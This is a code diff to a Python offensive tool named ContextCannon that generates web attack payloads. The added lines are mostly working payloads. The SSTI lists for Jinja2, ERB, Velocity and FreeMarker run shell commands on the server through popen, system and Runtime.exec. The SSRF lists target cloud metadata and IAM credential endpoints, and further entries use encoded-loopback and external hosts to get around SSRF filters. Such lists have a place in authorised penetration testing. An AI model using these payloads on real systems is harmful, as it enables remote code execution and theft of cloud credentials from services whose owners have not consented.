@@ -20,6 +20,8 @@ from urllib.parse import quote, quote_plus
 import html
 import base64
 
+__version__ = "1.0.0"
+
 # Colors
 class C:
     R = '\033[91m'; G = '\033[92m'; Y = '\033[93m'; B = '\033[94m'
@@ -127,14 +129,26 @@ class ContextCannon:
             'ssti': {
                 'detection': [
                     '${7*7}', '{{7*7}}', '#{7*7}',
-                    '<%= 7*7 %>', '{{config}}',
+                    '<%= 7*7 %>', '{{config}}', '${{7*7}}',
                 ],
                 'jinja2': [
                     '{{config}}',
                     "{{''.__class__.__mro__[1].__subclasses__()}}",
+                    '{{lipsum.__globals__["os"].popen("id").read()}}',
                 ],
                 'twig': [
                     '{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}',
+                ],
+                'erb': [
+                    '<%= system("id") %>',
+                    '<%= `id` %>',
+                    '<%= IO.popen("id").read %>',
+                ],
+                'velocity': [
+                    '#set($rt=$class.forName("java.lang.Runtime").getRuntime())$rt.exec("id")',
+                ],
+                'freemarker': [
+                    '<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
                 ],
             },
             'ssrf': {
@@ -147,10 +161,15 @@ class ContextCannon:
                     'http://169.254.169.254/latest/meta-data/',
                     'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
                     'http://metadata.google.internal/computeMetadata/v1/',
+                    'http://169.254.169.254/metadata/instance?api-version=2021-02-01',
+                    'http://100.100.100.200/latest/meta-data/',
                 ],
                 'bypass': [
                     'http://127.0.0.1.nip.io',
                     'http://localtest.me',
+                    'http://spoofed.burpcollaborator.net',
+                    'http://0177.0.0.1',
+                    'http://0x7f.0x0.0x0.0x1',
                 ],
             },
             'lfi': {
@@ -213,6 +232,7 @@ class ContextCannon:
 
 def main():
     parser = argparse.ArgumentParser(description='Context Cannon - Smart Payload Generation')
+    parser.add_argument('-V', '--version', action='version', version=f'context-cannon {__version__}')
     parser.add_argument('-t', '--type', choices=['xss', 'sqli', 'ssti', 'ssrf', 'lfi'],
                         help='Vulnerability type')
     parser.add_argument('-c', '--context', help='Specific context')
